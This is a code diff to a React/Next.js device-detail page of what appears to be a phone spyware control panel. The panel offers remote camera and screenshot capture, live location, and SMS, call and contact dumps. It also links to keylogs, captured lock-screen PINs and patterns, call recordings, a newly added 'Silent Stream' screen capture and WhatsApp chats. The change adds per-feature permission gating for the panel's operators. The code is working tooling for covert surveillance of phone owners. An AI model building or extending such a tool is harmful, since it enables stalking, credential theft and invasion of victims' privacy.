@@ -48,33 +48,39 @@ import {
 import Link from 'next/link';
 
 const commandButtons = [
-    { type: 'capture_screenshot', label: 'Screenshot', icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'capture' },
-    { type: 'capture_photo', label: 'Front Camera', icon: Camera, gradient: 'from-purple-500 to-pink-400', payload: { camera: 'front' }, category: 'capture' },
-    { type: 'capture_photo', label: 'Back Camera', icon: Camera, gradient: 'from-orange-500 to-amber-400', payload: { camera: 'back' }, category: 'capture' },
-    { type: 'get_location', label: 'Get Location', icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'sync' },
-    { type: 'dump_sms', label: 'Sync Latest SMS', icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', payload: { days: 1 }, category: 'sync' },
-    { type: 'dump_sms', label: 'Sync All SMS', icon: MessageSquare, gradient: 'from-pink-600 to-rose-500', category: 'sync', requiresConfirm: true },
-    { type: 'dump_calls', label: 'Sync Latest Calls', icon: Phone, gradient: 'from-cyan-500 to-blue-400', payload: { days: 1 }, category: 'sync' },
-    { type: 'dump_calls', label: 'Sync All Calls', icon: Phone, gradient: 'from-cyan-600 to-blue-500', category: 'sync', requiresConfirm: true },
-    { type: 'dump_contacts', label: 'Sync Contacts', icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'sync' },
+    { type: 'capture_screenshot', label: 'Screenshot', icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'capture', permission: 'screenshot' },
+    { type: 'capture_photo', label: 'Front Camera', icon: Camera, gradient: 'from-purple-500 to-pink-400', payload: { camera: 'front' }, category: 'capture', permission: 'camera_front' },
+    { type: 'capture_photo', label: 'Back Camera', icon: Camera, gradient: 'from-orange-500 to-amber-400', payload: { camera: 'back' }, category: 'capture', permission: 'camera_back' },
+    { type: 'get_location', label: 'Get Location', icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'sync', permission: 'live_location' },
+    { type: 'dump_sms', label: 'Sync Latest SMS', icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', payload: { days: 1 }, category: 'sync', permission: 'sms_sync' },
+    { type: 'dump_sms', label: 'Sync All SMS', icon: MessageSquare, gradient: 'from-pink-600 to-rose-500', category: 'sync', requiresConfirm: true, permission: 'sms_sync' },
+    { type: 'dump_calls', label: 'Sync Latest Calls', icon: Phone, gradient: 'from-cyan-500 to-blue-400', payload: { days: 1 }, category: 'sync', permission: 'calls_sync' },
+    { type: 'dump_calls', label: 'Sync All Calls', icon: Phone, gradient: 'from-cyan-600 to-blue-500', category: 'sync', requiresConfirm: true, permission: 'calls_sync' },
+    { type: 'dump_contacts', label: 'Sync Contacts', icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'sync', permission: 'contacts_sync' },
 ];
 
 const dataLinks = [
-    { href: 'stream', label: 'Live Stream', icon: Video, gradient: 'from-red-500 to-rose-400', description: 'Camera & mic feed', key: 'stream' },
-    { href: 'recordings', label: 'Recordings', icon: Mic, gradient: 'from-amber-500 to-yellow-400', description: 'Call recordings', key: 'recordings' },
-    { href: 'sms', label: 'Messages', icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', description: 'SMS history', key: 'sms' },
-    { href: 'send-sms', label: 'Send SMS', icon: Send, gradient: 'from-green-500 to-emerald-400', description: 'Send messages', key: 'send-sms' },
-    { href: 'calls', label: 'Call Logs', icon: Phone, gradient: 'from-emerald-500 to-teal-400', description: 'Call history', key: 'calls' },
-    { href: 'contacts', label: 'Contacts', icon: Users, gradient: 'from-purple-500 to-pink-400', description: 'Contact list', key: 'contacts' },
-    { href: 'keylogs', label: 'Keylogs', icon: Keyboard, gradient: 'from-orange-500 to-amber-400', description: 'Keystrokes', key: 'keylogs' },
-    { href: 'phone-lock', label: 'Phone Lock', icon: Lock, gradient: 'from-red-600 to-rose-500', description: 'PIN & Pattern', key: 'unlocks' },
-    { href: 'notifications', label: 'Notifications', icon: Bell, gradient: 'from-pink-500 to-rose-400', description: 'App alerts', key: 'notifications' },
-    { href: 'settings', label: 'Settings', icon: Settings, gradient: 'from-slate-600 to-zinc-500', description: 'Device config', key: 'settings' },
-    { href: 'gallery', label: 'Gallery', icon: Image, gradient: 'from-cyan-500 to-blue-400', description: 'Photos & media', key: 'gallery' },
-    { href: 'location', label: 'Location', icon: MapPin, gradient: 'from-yellow-500 to-orange-400', description: 'GPS history', key: 'locations' },
-    { href: 'files', label: 'Files', icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', description: 'Browse device files', key: 'files' },
-    { href: 'logs', label: 'App Logs', icon: Terminal, gradient: 'from-slate-500 to-gray-400', description: 'Debug logs', key: 'logs' },
-    { href: '/messages', label: 'Chat Apps', icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', description: 'WhatsApp & more', isExternal: true, key: 'chats' },
+    // Streaming options grouped together
+    { href: 'stream', label: 'Live Stream', icon: Video, gradient: 'from-red-500 to-rose-400', description: 'Camera & mic feed', key: 'stream', permission: 'stream' },
+    { href: 'silent-stream', label: 'Silent Stream', icon: Monitor, gradient: 'from-violet-500 to-purple-400', description: 'Screen capture', key: 'silent_stream', permission: 'stream_silent' },
+    // Messaging & Communication
+    { href: 'recordings', label: 'Recordings', icon: Mic, gradient: 'from-amber-500 to-yellow-400', description: 'Call recordings', key: 'recordings', permission: 'recordings' },
+    { href: 'sms', label: 'Messages', icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', description: 'SMS history', key: 'sms', permission: 'sms' },
+    { href: 'send-sms', label: 'Send SMS', icon: Send, gradient: 'from-green-500 to-emerald-400', description: 'Send messages', key: 'send-sms', permission: 'send_sms' },
+    { href: 'calls', label: 'Call Logs', icon: Phone, gradient: 'from-emerald-500 to-teal-400', description: 'Call history', key: 'calls', permission: 'calls' },
+    { href: 'contacts', label: 'Contacts', icon: Users, gradient: 'from-purple-500 to-pink-400', description: 'Contact list', key: 'contacts', permission: 'contacts' },
+    // Monitoring
+    { href: 'keylogs', label: 'Keylogs', icon: Keyboard, gradient: 'from-orange-500 to-amber-400', description: 'Keystrokes', key: 'keylogs', permission: 'keylogs' },
+    { href: 'phone-lock', label: 'Phone Lock', icon: Lock, gradient: 'from-red-600 to-rose-500', description: 'PIN & Pattern', key: 'unlocks', permission: 'phone_lock' },
+    { href: 'notifications', label: 'Notifications', icon: Bell, gradient: 'from-pink-500 to-rose-400', description: 'App alerts', key: 'notifications', permission: 'notifications' },
+    // Media & Files
+    { href: 'gallery', label: 'Gallery', icon: Image, gradient: 'from-cyan-500 to-blue-400', description: 'Photos & media', key: 'gallery', permission: 'gallery' },
+    { href: 'location', label: 'Location', icon: MapPin, gradient: 'from-yellow-500 to-orange-400', description: 'GPS history', key: 'locations', permission: 'location' },
+    { href: 'files', label: 'Files', icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', description: 'Browse device files', key: 'files', permission: 'files' },
+    // Device & Settings
+    { href: 'settings', label: 'Settings', icon: Settings, gradient: 'from-slate-600 to-zinc-500', description: 'Device config', key: 'settings', permission: 'settings' },
+    { href: 'logs', label: 'App Logs', icon: Terminal, gradient: 'from-slate-500 to-gray-400', description: 'Debug logs', key: 'logs', permission: 'logs' },
+    { href: '/messages', label: 'Chat Apps', icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', description: 'WhatsApp & more', isExternal: true, key: 'chats', permission: 'chat' },
 ];
 
 export default function DeviceDetailPage() {
@@ -93,7 +99,7 @@ function DeviceDetailContent() {
     const router = useRouter();
     const searchParams = useSearchParams();
     const deviceId = searchParams.get('id') as string;
-    const { isAuthenticated, isHydrated } = useAuthStore();
+    const { isAuthenticated, isHydrated, isAdmin, hasPermission } = useAuthStore();
 
     const [device, setDevice] = useState<any>(null);
     const [commands, setCommands] = useState<any[]>([]);
@@ -684,38 +690,40 @@ function DeviceDetailContent() {
                             {/* Data Tab */}
                             {activeTab === 'data' && (
                                 <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 animate-fade-in">
-                                    {dataLinks.map((link) => {
-                                        const Icon = link.icon;
-                                        // Handle external links (like /messages) differently
-                                        const linkHref = (link as any).isExternal
-                                            ? `${link.href}?deviceId=${deviceId}`
-                                            : `/devices/view/${link.href}/?id=${deviceId}`;
+                                    {dataLinks
+                                        .filter(link => isAdmin || hasPermission(link.permission))
+                                        .map((link) => {
+                                            const Icon = link.icon;
+                                            // Handle external links (like /messages) differently
+                                            const linkHref = (link as any).isExternal
+                                                ? `${link.href}?deviceId=${deviceId}`
+                                                : `/devices/view/${link.href}/?id=${deviceId}`;
 
-                                        // Get unread count for this link
-                                        const unreadCount = unreadCounts[link.key as keyof typeof unreadCounts] || 0;
+                                            // Get unread count for this link
+                                            const unreadCount = unreadCounts[link.key as keyof typeof unreadCounts] || 0;
 
-                                        return (
-                                            <Link key={link.href} href={linkHref}>
-                                                <div className="card bg-[var(--bg-elevated)] p-4 flex flex-col items-center gap-3 text-center group hover:shadow-lg relative overflow-visible">
-                                                    {/* Unread Badge */}
-                                                    {unreadCount > 0 && (
-                                                        <div className="absolute top-2 right-2 min-w-[22px] h-[22px] px-1.5 bg-red-500 rounded-full flex items-center justify-center shadow-lg z-10">
-                                                            <span className="text-white text-xs font-bold">
-                                                                {unreadCount > 99 ? '99+' : unreadCount}
-                                                            </span>
+                                            return (
+                                                <Link key={link.href} href={linkHref}>
+                                                    <div className="card bg-[var(--bg-elevated)] p-4 flex flex-col items-center gap-3 text-center group hover:shadow-lg relative overflow-visible">
+                                                        {/* Unread Badge */}
+                                                        {unreadCount > 0 && (
+                                                            <div className="absolute top-2 right-2 min-w-[22px] h-[22px] px-1.5 bg-red-500 rounded-full flex items-center justify-center shadow-lg z-10">
+                                                                <span className="text-white text-xs font-bold">
+                                                                    {unreadCount > 99 ? '99+' : unreadCount}
+                                                                </span>
+                                                            </div>
+                                                        )}
+                                                        <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${link.gradient} flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform`}>
+                                                            <Icon className="w-6 h-6 text-white" />
                                                         </div>
-                                                    )}
-                                                    <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${link.gradient} flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform`}>
-                                                        <Icon className="w-6 h-6 text-white" />
+                                                        <div>
+                                                            <span className="font-semibold text-sm text-[var(--text-primary)] block">{link.label}</span>
+                                                            <span className="text-xs text-[var(--text-muted)]">{link.description}</span>
+                                                        </div>
                                                     </div>
-                                                    <div>
-                                                        <span className="font-semibold text-sm text-[var(--text-primary)] block">{link.label}</span>
-                                                        <span className="text-xs text-[var(--text-muted)]">{link.description}</span>
-                                                    </div>
-                                                </div>
-                                            </Link>
-                                        );
-                                    })}
+                                                </Link>
+                                            );
+                                        })}
                                 </div>
                             )}
 
